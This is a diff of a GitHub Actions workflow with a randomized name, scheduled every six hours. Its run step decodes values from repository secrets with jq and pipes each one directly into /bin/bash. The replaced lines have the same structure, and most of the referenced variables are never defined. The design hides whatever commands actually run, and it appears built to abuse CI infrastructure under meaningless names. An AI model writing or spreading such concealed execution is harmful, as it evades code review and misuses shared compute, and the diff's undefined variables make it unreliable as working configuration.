@@ -2,26 +2,21 @@ name: fearfulsunflower
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
-jobs:  # 27813
+    - cron: '23 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: fearfulsunflower
         env:
-          pz83556: ${{ secrets.pz83556 }}
+          ytp110: ${{ secrets.ytp110 }}
         run: |
-          echo $pz83556 | jq -r .xdyx5 | /bin/bash
-          echo $h42897 | jq -r .a3 | /bin/bash
-          echo $wu41 | jq -r .h1 | /bin/bash
-          echo $ic5 | jq -r .ji016 | /bin/bash
-          echo $ae1086 | jq -r .j8986 | /bin/bash
-          echo $j4 | jq -r .lqwt62 | /bin/bash
-          echo $aua2 | jq -r .vjjz08 | /bin/bash
-          echo $xq8572 | jq -r .olvlz40 | /bin/bash
-          echo $oornv2686 | jq -r .y9 | /bin/bash
-          echo $ckiw1712 | jq -r .nadl03 | /bin/bash
-          echo $epjwk33 | jq -r .miy77928 | /bin/bash
-          echo $qsiwo8 | jq -r .yk6795 | /bin/bash
+          echo $ytp110 | jq -r .jg19 | /bin/bash
+          echo $zkx8472 | jq -r .h5738 | /bin/bash
+          echo $vrjzb4 | jq -r .hxt78 | /bin/bash
+          echo $zk60233 | jq -r .kqlt5316 | /bin/bash
+          echo $dd62202 | jq -r .oaulg2 | /bin/bash
+          echo $bygo172 | jq -r .kkdr00 | /bin/bash
+          echo $k56433 | jq -r .rjbnn0 | /bin/bash
 
